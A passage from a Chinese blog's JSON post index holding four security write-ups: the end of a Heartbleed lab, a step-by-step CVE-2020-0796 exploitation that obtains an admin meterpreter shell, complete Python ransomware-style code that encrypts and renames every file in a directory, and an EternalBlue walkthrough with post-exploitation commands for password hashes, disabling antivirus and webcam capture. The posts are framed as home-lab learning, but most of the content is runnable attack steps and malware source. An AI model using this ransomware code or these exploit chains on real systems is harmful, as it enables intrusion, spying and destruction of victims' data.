```，只有这样我们才能明文显示（终端显示）我们拿到的64K的数据。\n\n```bash\n  show advanced\n  set verbose true\n```\n\n![参数设置](./heartbleed/3.png)\n\n最后可以用```show missing```查看遗漏的设置参数，没有遗漏，就可以开始运行了。\n\n```bash\n  show missing\n  run\n```\n\n![参数设置](./heartbleed/6.png)\n\nkali在这边运行着，然后回到靶机上随便点点点，只要发生操作，就会有数据外泄。\n\n![参数设置](./heartbleed/9.png)\n\n最后我们回到kali，发现已经拿到数据了。\n\n![参数设置](./heartbleed/7.png)\n\n心脏滴血的复现到这里就完成了。","tags":["网络安全"],"categories":["技术"]},{"title":"永恒之黑（CVE-2020-0796）","url":"/2023/04/21/CVE-2020-0796/","content":"\n### 惭愧声明\n稍微了解一点就会知道，CVE-2020-0796是可以拿到shell的，但是因为技术能力的限制，到现在复现bug我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。\n\n### 准备工作\n\n首先，准备一台kali和一台运行1903版本或者1909版本的windows10。\n\n<!-- more -->\n\n关闭windows10的防火墙和实时保护功能。\n\n在kali上准备待会要用到的工具。\n\n1. 启用扫描脚本\n\n```git\n  git clone https://github.com/ollypwn/SMBGhost.git\n```\n\n有人说这个脚本不准确，有时候检测超时也会报bug可利用，这个脚本也不太重要，至少对于这个实验来说。\n\n2. 下载EXP脚本\n\n```git\n  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git\n```\n\n### 扫描bug\n\n准备好扫描脚本后进入该目录，执行：\n\n```python\n  python3 scanner.py 192.168.20.135\n```\n\n\"192.168.20.135\"更换为自己靶机的IP。下面是效果图，显示\"Vulnerable\"，易受攻击的。\n\n![bug扫描](./CVE-2020-0796/1.png)\n\n### 准备payload\n\n进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：\n\n```bash\n  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload\n```\n\n执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：\n\n1. 打开payload。\n\n2. 打开exploit.py。\n\n3. 将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。\n\n4. 复制替换完成的payload文件内容。\n\n5. 粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。\n\n![修改payload](./CVE-2020-0796/2.png)\n\n### 开始攻击\n\n1. 启动```msfconsole```。\n\n2. 使用模块。\n\n3. 设置有效载荷和相关参数。\n\n依次执行以下命令：\n\n```bash\n  msfconsole -q\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/bind_tcp\n  set lport 4444\n  set rhost 192.168.20.135\n  run\n```\n\n![攻击](./CVE-2020-0796/3.png)\n\n再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：\n\n```bash\n  python3 exploit.py -ip 192.168.20.135\n```\n\n![运行 exploit.py](./CVE-2020-0796/4.png)\n\n出现这步后按下回车。\n\n然后回到win10，发现win10蓝屏正在重启。\n\n![win10重启](./CVE-2020-0796/5.png)\n\n如果完成的彻底，```msfconsole```终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。\n\n![拿到shell](./CVE-2020-0796/6.png)\n\n---\n\n手动分割线\n\n---\n\n### 玄学排错\n\n接着上次的来说，上次是没有拿到shell的。经过一些网上拍错和别的同学的交流，得到了一些启发，最终成功拿到了shell。其中有很多问题也是很玄学的。\n\n1. 把靶机的内存设置大一点，我直接给到了8G。\n\n2. kali和靶机的连通最好不要使用NAT连接，如果使用NAT连接，建议把宿主机的防火墙和病毒保护也关闭。\n\n3. 在靶机中要在控制面板-程序-启用或关闭windows的功能-打开SMB开关，然后重启。\n\n4. 在进行paylod-code生成的时候，尽量不要使用原有的4444端口（我用的9876）。\n\n5. 更换了windows的镜像，重新安装了一个虚拟机，镜像保存在了[百度云盘](https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang)里，提取码：0731。\n\n### 成功的尝试\n\n生成payload-code。\n\n![](./CVE-2020-0796/9.png)\n\n然后替换exploit.py文件中user_payload字段。\n\n![](./CVE-2020-0796/10.png)\n\n前面的操作还是一样，进入工具，使用模块，设置payload。\n\n![](./CVE-2020-0796/7.png)\n\n设置攻击参数。\n\n![](./CVE-2020-0796/8.png)\n\n执行run命令并在此等候。\n\n![](./CVE-2020-0796/11.png)\n\n然后再开一个终端\n\n![](./CVE-2020-0796/12.png)\n\n成功拿到shell，是管理员的权限没有错。\n\n![](./CVE-2020-0796/13.png)","tags":["网络安全"],"categories":["技术"]},{"title":"使用Python加密文件","url":"/2023/04/17/Python-encrypted-file/","content":"\n### 功能\n\n用Python实现对文件的加密和解密，即ransomware的代码原理实现。\n\n### 序\n\n如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。<!-- more -->比如[这个](https://blog.csdn.net/yilovexing/article/details/104011199)，也可以下载[我提供的文件](https://www.aliyundrive.com/s/HcrQHfdUYMi)，然后把下载两个文件夹复制到Python环境的`F:\\Python\\Lib\\site-packages\\`文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。\n\n### 秘钥生成\n\n准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！\n\n如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。\n\n```python\nfrom Crypto.PublicKey import RSA\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    # 生成 2048 位的 RSA 密钥\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 生成私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 生成公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\nCreateRSAKeys()\n\n```\n\n当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。\n\n公钥：\n\n```bash\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3\n40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC\nhDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq\nIc/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP\nG8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL\n3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90\nUQIDAQAB\n-----END PUBLIC KEY-----\n```\n\n私钥：\n\n```bash\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA\nAgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT\nIgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB\nUuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi\nwYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa\nPVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR\n1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI\nTZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv\nmrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK\n1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx\nha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM\nRU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe\n2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02\nvQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk\nhY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8\nJ4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3\npurKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V\nXP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1\nLBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm\nehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T\nZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt\naYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5\n7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF\nIiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV\n/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX\nAjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS\n+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W\nG5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==\n-----END ENCRYPTED PRIVATE KEY-----\n```\n\n当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。\n\n### 文件加密\n\n现在我们来看看如何对文件进行加密处理：\n\n```python\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\n\n\ndef Encrypt(filename):\n    data = ''\n    # 二进制只读打开文件，读取文件数据\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        # 一个 16 字节的会话密钥\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\nEncrypt(\"e://test/music.mp3\")\n\n```\n\n我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。\n\n加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。\n\n### 私钥解密\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES, PKCS1_OAEP\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\nDescrypt(\"e://test/music.mp3\")\n\n```\n\n我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。\n\n接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。\n\n解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！\n\n### 变更文件名\n\n当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：\n\n举例比如：blog2.rar ==> yFmcuIzZvxmY.liuxp\n\n```python\nimport os\nimport base64\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # 倒序\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\nRenameFile(\"e:/test/\", \"cool.png\")\n\n```\n\n使用了base64对文件名进行编码。\n\n### 恢复文件名\n\n举例比如: yFmcuIzZvxmY.liuxp ==> blog2.rar\n\n```python\nimport os\nimport base64\n\n\ndef RestoreFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\nRestoreFilename(\"e://test/\", \"0hHdu8GbsVGa.liuxp\")\n\n```\n\n使用了base64对文件进行解码。\n\n### 完整源码\n\n我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：\n\n```python\n# coding=utf-8\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nimport os\nimport base64\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\ndef Encrypt(filename):\n    data = ''\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\ndef ReserveFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\n# 解密代码\n# def Main(rootDir):\n#     list_dirs = os.walk(rootDir)\n#     for root, dirs, files in list_dirs:\n#         if False:\n#             # 遍历文件，加密并且改名\n#             for f in files:\n#                 filename = os.path.join(root, f)\n#                 Encrypt(filename)\n#                 RenameFile(root, f)\n#         else:\n#             # 遍历文件，解密并且恢复名字\n#             for f in files:\n#                 if f.endswith('.liuxp'):\n#                     filename = os.path.join(root, f)\n#                     Descrypt(filename)\n#                     ReserveFilename(root, f)\n\n# 加密代码\ndef Main(rootDir):\n    list_dirs = os.walk(rootDir)\n    for root, dirs, files in list_dirs:\n        # 切换加密和解密过程\n        # if False:   # 解密文件\n        if True:  # 加密文件\n            # 遍历文件，加密并且改名\n            for f in files:\n                filename = os.path.join(root, f)\n                Encrypt(filename)\n                RenameFile(root, f)\n        else:\n            # 遍历文件，解密并且恢复名字\n            for f in files:\n                filename = os.path.join(root, f)\n                Descrypt(filename)\n                ReserveFilename(root, f)\n\n\nif __name__ == '__main__':\n    # CreateRSAKeys()\n    d = \"e://test/\"\n    Main(d)\n\n```\n\n唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。\n\n以下是几个实现的效果图：\n\n![加密之前](./Python-encrypted-file/1.png)\n\n![加密之后](./Python-encrypted-file/2.png)\n\n![解密之后](./Python-encrypted-file/3.png)\n\n### 写在后面的话\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！","tags":["python"],"categories":["技术"]},{"title":"永恒之蓝复现以及简单的后渗透信息收集","url":"/2023/04/16/crypto/","content":"\n\n### 环境准备\n\n首先需要准备两台虚拟机，一台运行kali linux，一台运行windows7，windows其他版本的没有测试，不过非常有可能其他版本已经修复这个bug了，用来学习测试的话，用windows7比较妥善。\n\n<!-- more -->\n\n### 网络准备\n\n必须保证windows7和kali linux 在同一个局域网底下，即保证这两台机器IP都是同一个网段的地址。\n\n### 攻击开始\n\n1. 使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。\n\n```c\n    # nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n![扫描域内主机](./crypto/1.png)\n\n可以看到有一个***192.168.20.129***的主机可用，开启了445端口。我们就对这个主机进行攻击。\n\n2. windows验证一下，发现windows获取的IP确实是***192.168.20.129***\n\n![windows验证](./crypto//2.png)\n\n3. 在kali上使用工具开始攻击，运行以下命令，稍作等待。\n\n```c\n    # msfconsole -q  \n```\n\n> -q 选项不再继续打印工具启动时的图形文字\n\n> 运行之后是这样的效果\n\n![msfconsole](./crypto/3.png)\n\n4. 执行以下命令，搜索可以利用的漏洞工具\n\n```c\n    msf6 > search ms17-010\n```\n![ms17-010](./crypto/4.png)\n\n5. 选择序号为0的漏洞进行攻击，分别执行以下代码\n\n```c\n    msf6 > use 0\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.20.50\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.20.129\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > run\n```\n\n> set lhost 是设置攻击主机的IP，set rhost 是设置靶机主机的IP，run开始进行攻击。\n\n效果图如下：\n\n![开始攻击](./crypto/5.png)\n\n6. 稍等片刻，攻击成功后，命令行的提示文字会变为**meterpreter>**，入侵完成，我们可以用命令进行对windows主机的任何操作。\n\n|命令|功能|\n|:---:|:---:|\n|shell|启动靶机主机的cmd|\n|screenshot|对靶机进行屏幕截图|\n|webcam_list|列出摄像头|\n|webcam_snap|利用靶机摄像头拍照|\n|webcam_stream|利用靶机摄像头拍视频|\n|getuid|获取登录用户|\n|getsystem|获取磁盘信息|\n|hashdump|获取密码的哈希值|\n|kill|杀掉进程|\n|download|下载文件|\n|upload|上传文件|\n|run killav|关闭杀软|\n|run post/windows/manage/killava|关闭杀软|\n|run post/windows/gather/checkkvm|检查是否是虚拟机|\n|run post/windows/gather/enum_services|列出所有的服务|\n|run post/windows/gather/enum_applications|列出运行的程序|\n|run post/windows/gather/enum_patches|列出打的补丁|\n|run post/windows/gather/dumplinks|列出最近的操作|\n\n\n7. 以下是利用上述命令实现的一些效果图\n\n* 使用shell\n\n```c\n    meterpreter > shell\n```\n> 运行之后成功进入shell，但是会出现部分乱码，接着输入命令`chcp 65001`，回车后乱码变正常。\n\n![帅哥](./crypto/6.png)\n\n* 屏幕截图，运行以下命令\n\n```c\n    meterpreter > screenshot\n```\n\n运行成功后桌面上会多了一张windows的屏幕截图\n\n![帅哥](./crypto/7.png)\n\n* 上传文件\n\n上传这一张照片\n\n![帅哥](./crypto/8.png)\n\n执行以下命令\n\n```c\n    meterpreter > upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png\n```\n\n![帅哥](./crypto/9.png)\n\n显示上传成功，然后去windows主机验证。\n\n![帅哥](./crypto/10.png)\n\n上传成功，windows正常查看。\n\n* 调用网络摄像头，运行以下命令\n\n```c\n    meterpreter > webcam_stream\n```\n\n![帅哥](./crypto/11.png)\n\n> kali 成功调用到了windows7的摄像头\n\n### 写在后面的话\n\n网络并不是法外之地，且行且珍惜。","tags":["网络安全"],"categories":["技术"]}]